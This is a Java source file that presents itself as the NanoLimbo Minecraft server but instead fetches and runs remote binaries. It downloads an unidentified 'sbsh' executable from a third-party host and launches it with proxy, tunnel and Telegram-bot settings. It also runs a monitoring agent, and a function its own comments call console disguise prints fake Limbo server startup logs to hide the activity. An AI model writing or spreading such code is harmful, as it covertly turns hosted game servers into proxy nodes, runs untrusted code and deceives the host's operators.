package ua.nanit.limbo;

import java.io.*;
import java.net.URL;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.*;
import java.util.concurrent.atomic.AtomicBoolean;

public final class NanoLimbo {

    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_RESET = "\033[0m";

    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static final AtomicBoolean forwardLogs = new AtomicBoolean(true);

    private static Process sbxProcess;
    private static Process komariProcess;

    private static final ScheduledExecutorService SCHED = Executors.newScheduledThreadPool(2);

    private static final String[] ALL_ENV_VARS = {
            "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
            "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
            "HY2_PORT", "S5_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT",
            "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME",
            "KOMARI_SERVER", "KOMARI_TOKEN", "KOMARI_AUTO_KEY",
            "KOMARI_FILE_PATH"
    };

    public static void main(String[] args) {
        try {
            Map<String, String> envVars = new HashMap<>();
            loadEnvVars(envVars);

            startKomari(envVars);

            while (running.get()) {
                Thread.sleep(1000);
            }

        } catch (Exception e) {
            System.err.println(ANSI_RED + "Error: " + e.getMessage() + ANSI_RESET);
            e.printStackTrace();
        }
    }

    // ================= KOMARI FIX CORE =================

    private static void startKomari(Map<String, String> env) {
        String server = env.getOrDefault("KOMARI_SERVER", "");
        String token = env.getOrDefault("KOMARI_TOKEN", "");
        String autoKey = env.getOrDefault("KOMARI_AUTO_KEY", "");
        String filePath = env.getOrDefault("KOMARI_FILE_PATH", "./cache");

        File workDir = new File(filePath);
        if (!workDir.exists()) workDir.mkdirs();

        File targetFile = new File(workDir, "auto-discovery.json");

        // ================= 1. 全局搜索 json =================
        File found = searchFile(Paths.get(".").toAbsolutePath(), "auto-discovery.json");

        if (found != null) {
            try {
                System.out.println(ANSI_GREEN + "Found auto-discovery.json at: " + found.getAbsolutePath() + ANSI_RESET);

                Files.createDirectories(workDir.toPath());
                Files.move(found.toPath(), targetFile.toPath(), StandardCopyOption.REPLACE_EXISTING);

                System.out.println(ANSI_GREEN + "Moved to KOMARI_FILE_PATH" + ANSI_RESET);
            } catch (Exception e) {
                System.err.println(ANSI_RED + "Failed to move file: " + e.getMessage() + ANSI_RESET);
            }
        }

        // ================= 2. 判断 token 来源 =================
        boolean hasFileToken = targetFile.exists();

        String fileToken = null;
        if (hasFileToken) {
            fileToken = readTokenFromFile(targetFile);
        }

        boolean enabled = !server.isEmpty() && (hasFileToken || !token.isEmpty() || !autoKey.isEmpty());

        if (!enabled) {
            System.out.println(ANSI_RED + "Komari disabled" + ANSI_RESET);
            return;
        }

        try {
            Path agent = downloadKomariAgent();

            List<String> cmd = new ArrayList<>();
            cmd.add(agent.toAbsolutePath().toString());
            cmd.add("-e");
            cmd.add(formatEndpoint(server));

            // ================= 3. 优先 FILE TOKEN =================
            if (fileToken != null && !fileToken.isEmpty()) {
                cmd.add("-t");
                cmd.add(fileToken);
                System.out.println(ANSI_GREEN + "Komari FILE TOKEN mode" + ANSI_RESET);

            } else if (!token.isEmpty()) {
                cmd.add("-t");
                cmd.add(token);
                System.out.println(ANSI_GREEN + "Komari ENV TOKEN mode" + ANSI_RESET);

            } else {
                cmd.add("--auto-discovery");
                cmd.add(autoKey);
                System.out.println(ANSI_GREEN + "Komari AUTO mode" + ANSI_RESET);
            }

            ProcessBuilder pb = new ProcessBuilder(cmd);
            pb.directory(workDir);
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);

            komariProcess = pb.start();

        } catch (Exception e) {
            System.err.println(ANSI_RED + "Komari start failed: " + e.getMessage() + ANSI_RESET);
        }
    }

    // ================= FILE SEARCH =================

    private static File searchFile(Path root, String fileName) {
        try {
            if (!Files.exists(root)) return null;

            try (var stream = Files.walk(root, 6)) {
                return stream
                        .filter(p -> p.getFileName().toString().equals(fileName))
                        .findFirst()
                        .map(Path::toFile)
                        .orElse(null);
            }
        } catch (Exception e) {
            return null;
        }
    }

    private static String readTokenFromFile(File file) {
        try {
            String json = Files.readString(file.toPath());

            int idx = json.indexOf("\"token\"");
            if (idx != -1) {
                int start = json.indexOf("\"", idx + 7) + 1;
                int end = json.indexOf("\"", start);
                return json.substring(start, end);
            }
        } catch (Exception ignored) {}
        return "";
    }


    private static Path downloadKomariAgent() throws IOException {
        String arch = System.getProperty("os.arch").toLowerCase();
        String file;

        if (arch.contains("amd64") || arch.contains("x86_64")) {
            file = "komari-agent-linux-amd64";
        } else if (arch.contains("arm64") || arch.contains("aarch64")) {
            file = "komari-agent-linux-arm64";
        } else {
            throw new RuntimeException("Unsupported arch: " + arch);
        }

        String url = "https://github.com/komari-monitor/komari-agent/releases/latest/download/" + file;

        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "komari-agent");

        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            path.toFile().setExecutable(true);
        }

        return path;
    }

    private static String formatEndpoint(String ep) {
        ep = ep.trim();
        if (!ep.startsWith("http")) {
            ep = "https://" + ep;
        }
        if (ep.endsWith("/")) {
            ep = ep.substring(0, ep.length() - 1);
        }
        return ep;
    }

    // ================= renew =================

    private static void startRenewScript() {
        try {
            File renewScript = new File("renew.sh");
            if (renewScript.exists()) {
                new ProcessBuilder("bash", "renew.sh")
                        .inheritIO()
                        .start();
                System.out.println(ANSI_GREEN + "renew.sh 已启动" + ANSI_RESET);
            }
        } catch (Exception e) {
            System.err.println(ANSI_RED + "renew.sh 启动失败" + ANSI_RESET);
        }
    }

    // ================= s-box =================

    private static void runSbxBinary(Map<String, String> envVars) throws Exception {
        ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
        pb.environment().putAll(envVars);
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.PIPE);

        sbxProcess = pb.start();

        new Thread(() -> {
            try (BufferedReader reader = new BufferedReader(
                    new InputStreamReader(sbxProcess.getInputStream()))) {
                String line;
                long startTime = System.currentTimeMillis();
                while ((line = reader.readLine()) != null) {
                    if (forwardLogs.get() && System.currentTimeMillis() - startTime < 20000) {
                        System.out.println(line);
                    }
                }
            } catch (IOException ignored) {}
        }).start();
    }

    // ================= 控制台伪装 =================

    private static void resetConsoleAndShowFakeLogs() {
        try {
            String os = System.getProperty("os.name").toLowerCase();
            if (os.contains("win")) {
                new ProcessBuilder("cmd", "/c", "cls && mode con: lines=30 cols=120")
                        .inheritIO().start().waitFor();
            } else {
                System.out.print("\033c");
                System.out.flush();
            }
        } catch (Exception ignored) {}

        System.out.println(ANSI_GREEN + "" + ANSI_RESET);
        printFakeLimboLogs();
    }

    private static void printFakeLimboLogs() {
        String[] logs = {
            "[INFO] [LimboServer] Starting LimboServer v1.0.0 (mock build)",
            "[INFO] [LimboServer] Loading configuration...",
            "[INFO] [LimboServer] Initializing server components...",
            "[INFO] [LimboServer] Preparing world 'world'",
            "[INFO] [LimboServer] Binding to port 25565...",
            "[INFO] [LimboServer] Done (5.123s)! For help, type \"help\"",
            "[INFO] [LimboServer] Server is running in offline mode.",
            "[INFO] [LimboServer] Installation completed successfully."
        };

        for (String log : logs) {
            System.out.println(log);
            try {
                Thread.sleep(1200);
            } catch (InterruptedException ignored) {}
        }
    }

    // ================= ENV =================

    private static void loadEnvVars(Map<String, String> envVars) {
        envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b385");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "");
        envVars.put("ARGO_PORT", "8001");
        envVars.put("ARGO_DOMAIN", "");
        envVars.put("ARGO_AUTH", "");
        envVars.put("HY2_PORT", "40368");
        envVars.put("S5_PORT", "40368");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "");
        envVars.put("UPLOAD_URL", "");
        envVars.put("DISABLE_ARGO", "false");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "www.ntu.edu.sg");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "ceshi");

        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);
            }
        }
    }

    // ================= Binary =================

    private static Path getBinaryPath() throws IOException {
        String arch = System.getProperty("os.arch").toLowerCase();
        String url;

        if (arch.contains("amd64")) {
            url = "https://amd64.ssss.nyc.mn/sbsh";
        } else if (arch.contains("arm64")) {
            url = "https://arm64.ssss.nyc.mn/sbsh";
        } else {
            throw new RuntimeException("Unsupported arch");
        }

        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");

        if (!Files.exists(path)) {
            try (InputStream in = new URL(url).openStream()) {
                Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
            }
            path.toFile().setExecutable(true);
        }

        return path;
    }

    // ================= Stop =================

    private static void stopServices() {
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
        }
        if (komariProcess != null && komariProcess.isAlive()) {
            komariProcess.destroy();
        }
    }
}